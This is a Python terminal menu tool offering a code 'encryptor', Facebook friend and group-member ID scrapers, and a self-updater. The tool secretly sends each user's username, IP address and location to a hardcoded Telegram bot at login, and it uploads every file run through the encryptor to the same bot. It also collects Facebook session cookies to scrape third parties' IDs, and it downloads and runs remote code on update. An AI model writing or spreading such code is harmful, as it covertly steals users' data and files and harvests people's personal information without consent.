import os
import sys
import base64
import marshal
import zlib
import time
from datetime import datetime
import requests
import re
from bs4 import BeautifulSoup

# Telegram bot details
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID = "1241769879"

# Colors
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKRED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Telegram log
def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        requests.get(url)
    except: pass

# Get IP info
def get_ip_info():
    try:
        ip_info = requests.get('http://ipinfo.io/json').json()
        ip = ip_info.get('ip', 'N/A')
        geo = f"{ip_info.get('city','')}, {ip_info.get('region','')}, {ip_info.get('country','')}"
        return ip, geo
    except:
        return 'N/A', 'N/A'

# Login
def login():
    os.system("clear")
    print(f"{Colors.OKGREEN}[•] Public login to access the tool{Colors.ENDC}")
    username = input(f"{Colors.OKCYAN}[•] Enter your Telegram Username: {Colors.ENDC}")
    if not username.strip():
        print(f"{Colors.FAIL}[•] Invalid username!{Colors.ENDC}")
        return
    ip, geo = get_ip_info()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log = f"[•] Login Details:\n[•] Username: {username}\n[•] IP: {ip}\n[•] Location: {geo}\n[•] Time: {now}"
    send_telegram_message(log)
    print(f"{Colors.OKGREEN}[•] Welcome {username}! Access granted.{Colors.ENDC}")

# Encrypt Code
def encrypt_code():
    print(f"{Colors.OKGREEN}[•] Code Encryptor Selected{Colors.ENDC}")
    file = input(f"{Colors.OKBLUE}[•] Enter File Name: {Colors.ENDC}")
    if not os.path.exists(file):
        print(f"{Colors.FAIL}[•] File not found!{Colors.ENDC}")
        return
    code = open(file).read()
    print(f"{Colors.OKCYAN}[1] Base64\n[2] Marshal\n[3] Zlib{Colors.ENDC}")
    method = input(f"{Colors.OKBLUE}[•] Choose Method: {Colors.ENDC}")
    if method == "1":
        encoded = base64.b64encode(code.encode()).decode()
    elif method == "2":
        encoded = marshal.dumps(compile(code, '', 'exec'))
    elif method == "3":
        encoded = zlib.compress(code.encode())
    else:
        print(f"{Colors.FAIL}[•] Invalid method!{Colors.ENDC}")
        return
    out_file = f"enc_{os.path.splitext(file)[0]}.py"
    with open(out_file, "w" if method == "1" else "wb") as f:
        f.write(encoded if isinstance(encoded, str) else encoded)
    print(f"{Colors.OKGREEN}[•] Saved: {out_file}{Colors.ENDC}")
    try:
        with open(out_file, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}", files={"document": f})
    except Exception as e:
        send_telegram_message(f"Encryption send failed: {str(e)}")

# Facebook ID Extractor
def fb_ids():
    print(f"{Colors.OKGREEN}[•] Facebook IDs Extractor{Colors.ENDC}")
    uid = input(f"{Colors.OKBLUE}[•] Enter Profile URL or ID: {Colors.ENDC}")
    cookie = input(f"{Colors.OKCYAN}[•] Enter Facebook Cookie: {Colors.ENDC}")
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Cookie": cookie
    }
    seen = set()
    def extract_ids(url, depth=1):
        try:
            res = requests.get(url, headers=headers)
            soup = BeautifulSoup(res.text, "html.parser")
            links = soup.find_all("a", href=True)
            for a in links:
                href = a['href']
                if "/profile.php?id=" in href or "/friends/" in href or "facebook.com/" in href:
                    name = a.text.strip()
                    match = re.search(r'id=(\d+)', href) or re.search(r'facebook.com/([^/?&]+)', href)
                    if match:
                        uid = match.group(1)
                        if uid not in seen:
                            seen.add(uid)
                            with open("ids.txt", "a") as f:
                                f.write(f"{uid} | {name}\n")
            nexts = [a['href'] for a in links if "See More" in a.text or "Lihat Selengkapnya" in a.text]
            if nexts and depth < 3:
                extract_ids("https://mbasic.facebook.com" + nexts[0], depth+1)
        except Exception as e:
            print(f"{Colors.FAIL}[•] Error: {e}{Colors.ENDC}")
    base_url = f"https://mbasic.facebook.com/{uid}?v=friends"
    extract_ids(base_url)
    print(f"{Colors.OKGREEN}[•] Saved to ids.txt{Colors.ENDC}")

# Group Member Dumper
def group_dump():
    print(f"{Colors.OKGREEN}[•] Group Member ID Dumper{Colors.ENDC}")
    group = input(f"{Colors.OKBLUE}[•] Enter Group URL or ID: {Colors.ENDC}")
    cookie = input(f"{Colors.OKCYAN}[•] Enter Facebook Cookie: {Colors.ENDC}")
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Cookie": cookie
    }
    if "facebook.com" not in group:
        group = f"https://mbasic.facebook.com/groups/{group}"
    if not group.startswith("http"):
        group = f"https://mbasic.facebook.com/groups/{group}"
    try:
        res = requests.get(group, headers=headers)
        if "Join Group" in res.text:
            print(f"{Colors.FAIL}[•] Invalid or Private Group!{Colors.ENDC}")
            return
        soup = BeautifulSoup(res.text, "html.parser")
        members = set()
        def parse_members(url):
            res = requests.get(url, headers=headers)
            soup = BeautifulSoup(res.text, "html.parser")
            for a in soup.find_all("a", href=True):
                href = a["href"]
                if "profile.php?id=" in href or "/friends/" in href:
                    name = a.text.strip()
                    match = re.search(r'id=(\d+)', href) or re.search(r'facebook.com/([^/?&]+)', href)
                    if match:
                        uid = match.group(1)
                        if uid not in members:
                            members.add(uid)
                            with open("ids.txt", "a") as f:
                                f.write(f"{uid} | {name}\n")
            nexts = [a['href'] for a in soup.find_all("a") if "See More" in a.text or "Lihat Selengkapnya" in a.text]
            if nexts:
                parse_members("https://mbasic.facebook.com" + nexts[0])
        parse_members(group)
        print(f"{Colors.OKGREEN}[•] Dumped to ids.txt{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[•] Error: {str(e)}{Colors.ENDC}")

# Update Tool
def update_tool():
    print(f"{Colors.OKCYAN}[•] Updating tool...{Colors.ENDC}")
    try:
        url = "https://raw.githubusercontent.com/t9cxy/alone-menu/refs/heads/main/main.py"
        r = requests.get(url)
        open("main.py", "wb").write(r.content)
        print(f"{Colors.OKGREEN}[•] Updated successfully. Restarting...{Colors.ENDC}")
        os.system("python3 main.py")
    except Exception as e:
        print(f"{Colors.FAIL}[•] Update failed: {e}{Colors.ENDC}")

# Main Menu
def main_menu():
    while True:
        os.system("clear")
        print(f"""{Colors.OKRED}
  █████╗ ██╗      ██████╗  ███╗   ██╗███████╗
 ██╔══██╗██║     ██╔═══██╗ ████╗  ██║██╔════╝
 ███████║██║     ██║   ██║ ██╔██╗ ██║█████╗  
 ██╔══██║██║     ██║   ██║ ██║╚██╗██║██╔══╝  
 ██║  ██║███████╗╚██████╔╝ ██║ ╚████║███████╗
 ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═╝  ╚═══╝╚══════╝
        {Colors.ENDC}""")

        print(f"{Colors.OKCYAN}[1] Proxy Options")
        print(f"[2] User-Agent Generator")
        print(f"[3] Send HTTP Request")
        print(f"[4] Look IP Info")
        print(f"[5] Facebook IDs Extractor")
        print(f"[6] Group Member ID Dumper")
        print(f"[7] Encrypt Code")
        print(f"[8] Rerun Tool (Auto-Update)")
        print(f"{Colors.FAIL}[0] Exit{Colors.ENDC}")
        choice = input(f"{Colors.BOLD}[•] Choose an option: {Colors.ENDC}")
        if choice == "0":
            print(f"{Colors.OKGREEN}[•] Goodbye!{Colors.ENDC}")
            break
        elif choice == "1":
            print(f"{Colors.WARNING}[•] Proxy Options Coming Soon!{Colors.ENDC}")
        elif choice == "2":
            print(f"{Colors.WARNING}[•] User-Agent Generator Coming Soon!{Colors.ENDC}")
        elif choice == "3":
            print(f"{Colors.WARNING}[•] HTTP Request Feature Coming Soon!{Colors.ENDC}")
        elif choice == "4":
            print(f"{Colors.WARNING}[•] IP Info Lookup Coming Soon!{Colors.ENDC}")
        elif choice == "5":
            fb_ids()
        elif choice == "6":
            group_dump()
        elif choice == "7":
            encrypt_code()
        elif choice == "8":
            update_tool()
        else:
            print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")
        input(f"{Colors.OKCYAN}\n[•] Press Enter to return to menu...{Colors.ENDC}")

# Run
if __name__ == "__main__":
    login()
    main_menu()